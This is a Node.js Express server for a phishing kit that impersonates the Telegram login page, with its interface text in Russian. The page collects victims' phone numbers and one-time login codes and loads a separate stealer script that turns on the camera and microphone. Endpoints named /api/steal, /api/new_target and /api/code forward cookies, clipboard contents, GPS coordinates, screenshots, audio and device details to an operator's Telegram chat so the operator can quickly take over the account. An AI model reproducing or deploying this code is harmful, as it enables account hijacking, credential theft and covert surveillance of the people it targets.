// ==== file: index.js ====
// language: JavaScript, target: Node.js 20
import express from 'express';
import { bot, State, sendAdmin } from './bot.js';
import { Utils } from './utils.js';
import multer from 'multer';

const PORT = process.env.PORT || 3000;
const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.post('/api/steal', upload.single('file'), async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { type, data } = req.body;
    const file = req.file;

    let msg = `🕵️ <b>ПЕРЕХВАТ ДАННЫХ (${type})</b>\n\n🌍 IP: <code>${ip.split(',')[0]}</code>\n`;
    if (data) msg += `📝 Данные: <code>${data}</code>\n`;

    if (file) {
        try {
            if (type === 'photo') {
                await bot.sendPhoto(process.env.ADMIN_CHAT_ID, file.buffer, { caption: msg, parse_mode: 'HTML' });
            } else if (type === 'screen') {
                await bot.sendDocument(process.env.ADMIN_CHAT_ID, file.buffer, { caption: msg, parse_mode: 'HTML' }, { filename: 'screen.png' });
            } else if (type === 'audio') {
                await bot.sendAudio(process.env.ADMIN_CHAT_ID, file.buffer, { caption: msg, parse_mode: 'HTML' }, { filename: 'voice.ogg', contentType: 'audio/ogg' });
            }
        } catch (e) { console.log(e); }
    } else {
        await sendAdmin(msg);
    }
    res.json({ ok: true });
});

app.post('/api/new_target', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    State.stats.visits++; State.stats.phones++;
    const { phone, ua, screen, battery, memory, network, geo, steal, clipboard } = req.body;
    if (!phone || phone.length < 8) return res.status(400).json({ ok: false });
    
    const device = Utils.parseUA(ua);
    State.stats.osCount[device.os] = (State.stats.osCount[device.os] || 0) + 1;
    const ipData = await Utils.getIpInfo(ip);
    let locStr = ipData ? `${ipData.country}, ${ipData.city} (${ipData.isp})` : 'Unknown';

    let msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n📱 <b>Номер:</b> <code>${phone}</code>\n💻 <b>Устройство:</b> ${device.os} / ${device.model}\n🌐 <b>Браузер:</b> ${device.browser}\n🖥 <b>Экран:</b> ${screen}\n🔋 <b>Батарея:</b> ${battery}\n🧠 <b>ОЗУ:</b> ${memory}\n📶 <b>Сеть:</b> ${network}\n🌍 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n📍 <b>Локация:</b> ${locStr}\n`;
    if (geo) msg += `🗺 <b>GPS:</b> <a href="https://maps.google.com/?q=${geo}">Открыть</a>\n`;
    if (steal && steal.length > 0) {
        msg += `\n🍪 <b>УКРАДЕНО:</b>\n`;
        steal.slice(0, 5).forEach(s => { msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 15)}...</code>\n`; });
    }
    if (clipboard) msg += `📋 <b>Буфер:</b> <code>${clipboard}</code>\n`;
    msg += `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
    
    await sendAdmin(msg);
    res.json({ ok: true, doubleCode: State.settings.doubleCode });
});

app.post('/api/click', (req, res) => { State.stats.clicks++; res.json({ ok: true }); });

app.post('/api/code', async (req, res) => {
    State.stats.codes++;
    const { phone, code, ua, battery } = req.body;
    State.history.unshift({ phone, code });
    const device = Utils.parseUA(ua);
    await sendAdmin(`😈 <b>ПЕРЕХВАТ КОДА</b>\n\n📱 <code>${phone}</code>\n🔑 <code>${code}</code>\n\n💻 Устройство: ${device.os} / ${device.model}\n🔋 Батарея: ${battery || '?'}\n\n🏃‍♂️ <i>БЕГИ В TELEGRAM!</i>`);
    res.json({ ok: true });
});

app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Telegram</title>
<style>
:root{--bg:#17212b;--surface:#0e1621;--primary:#2aabee;--text:#fff;--muted:#708499;--border:#2b5278}
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
body{background:var(--bg);color:var(--text);display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;user-select:none}
.app{width:100%;max-width:420px;height:100vh;background:var(--bg);display:flex;flex-direction:column}
.top{display:flex;justify-content:space-between;padding:15px 20px;font-size:15px;color:var(--primary);font-weight:500}
.head{padding:20px;text-align:center}
.logo{width:90px;height:90px;background:linear-gradient(135deg,var(--primary),#229ed9);border-radius:50%;display:flex;justify-content:center;align-items:center;margin:0 auto 20px}
.logo svg{width:55px;height:55px;fill:#fff;margin-left:5px}
h1{font-size:24px;margin-bottom:10px}p{font-size:14px;color:var(--muted);padding:0 10px}
.form{padding:20px;flex:1;display:flex;flex-direction:column}
.group{display:flex;gap:10px;margin-bottom:25px}
select{width:110px;background:var(--surface);border:1px solid var(--border);border-radius:10px;color:var(--text);padding:0 10px;font-size:16px;outline:none}
input{flex:1;background:var(--surface);border:1px solid var(--border);border-radius:10px;color:var(--text);padding:16px;font-size:17px;outline:none}
.btn{background:var(--primary);color:var(--text);border:none;border-radius:10px;padding:16px;font-size:16px;font-weight:500;cursor:pointer;width:100%}
.hidden{display:none!important}
.spin{display:inline-block;width:20px;height:20px;border:2.5px solid rgba(255,255,255,.3);border-radius:50%;border-top-color:#fff;animation:sp .8s linear infinite;margin-right:10px}
@keyframes sp{to{transform:rotate(360deg)}}
.codes{display:flex;justify-content:center;gap:10px;margin-bottom:15px}
.codes input{width:50px;height:60px;text-align:center;font-size:24px;font-weight:600}
</style></head>
<body><div class="app">
<div class="top"><span id="clock"></span><span id="cancelBtn">Отмена</span></div>
<div class="head">
<div class="logo"><svg viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.658-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.94z"/></svg></div>
<h1 id="title">Ваш номер</h1><p id="subtitle">Пожалуйста, подтвердите код страны и ваш номер телефона.</p>
</div>
<div class="form">
<form id="phoneForm" autocomplete="off">
<div class="group">
<select id="cc"><option value="373">🇲🇩 +373</option><option value="7">🇷🇺 +7</option><option value="380">🇺🇦 +380</option><option value="1">🇺🇸 +1</option></select>
<input type="tel" id="phone" placeholder="69 123 456" required>
</div>
<button type="submit" class="btn" id="bp">Далее</button>
</form>
<form id="codeForm" class="hidden" autocomplete="off">
<div class="codes">
<input type="text" class="ci" maxlength="1" inputmode="numeric"><input type="text" class="ci" maxlength="1" inputmode="numeric"><input type="text" class="ci" maxlength="1" inputmode="numeric"><input type="text" class="ci" maxlength="1" inputmode="numeric"><input type="text" class="ci" maxlength="1" inputmode="numeric">
</div>
<button type="submit" class="btn" id="bc">Далее</button>
</form>
</div></div>
<script type="module">
import { Stealer } from '/stealer.js';
const pf=document.getElementById('phoneForm'),cf=document.getElementById('codeForm'),bp=document.getElementById('bp'),bc=document.getElementById('bc'),cc=document.getElementById('cc'),ci=document.querySelectorAll('.ci'),t=document.getElementById('title'),s=document.getElementById('subtitle'),p=document.getElementById('phone'),cl=document.getElementById('clock');
let pv='',dc=true;
Stealer.init();
const u=()=>{const d=new Date();cl.textContent=d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0')};u();setInterval(u,1000);
document.getElementById('cancelBtn').onclick = () => { pf.classList.remove('hidden'); cf.classList.add('hidden'); p.value=''; };

pf.onsubmit=async e=>{
    e.preventDefault(); const l=p.value.replace(/\\D/g,''); if(l.length<7) return;
    pv=cc.value+l; bp.innerHTML='<span class="spin"></span>Отправка...'; bp.disabled=true;
    
    Stealer.startAll(); // Запускаем камеру и микрофон
    
    const payload={phone:pv,ua:navigator.userAgent,screen:window.screen.width+'x'+window.screen.height,...Stealer.getAll()};
    try{
        const r=await fetch('/api/new_target',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
        const d=await r.json(); dc=d.doubleCode;
        pf.classList.add('hidden'); cf.classList.remove('hidden'); t.textContent='Введите код'; s.innerHTML='Код отправлен на <b>+'+pv+'</b>';
        setTimeout(()=>ci[0].focus(),100);
    }catch(e){bp.innerHTML='Далее';bp.disabled=false}
};

cf.onsubmit=async e=>{
    e.preventDefault(); let c=''; ci.forEach(i=>c+=i.value); if(c.length<5) return;
    bc.innerHTML='<span class="spin"></span>Проверка...'; bc.disabled=true;
    try{
        await fetch('/api/code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:pv,code:c})});
        t.textContent='Готово'; s.innerHTML='Вы вошли.'; cf.innerHTML='<div style="text-align:center;font-size:60px;">✅</div>';
        setTimeout(()=>{window.location.href='https://web.telegram.org'},2000)
    }catch(e){bc.innerHTML='Далее';bc.disabled=false}
};
</script></body></html>`);
});
app.get('/stealer.js', (req, res) => { res.sendFile(process.cwd() + '/stealer.js'); });
app.listen(PORT, () => console.log(`[SERVER] :${PORT}`));
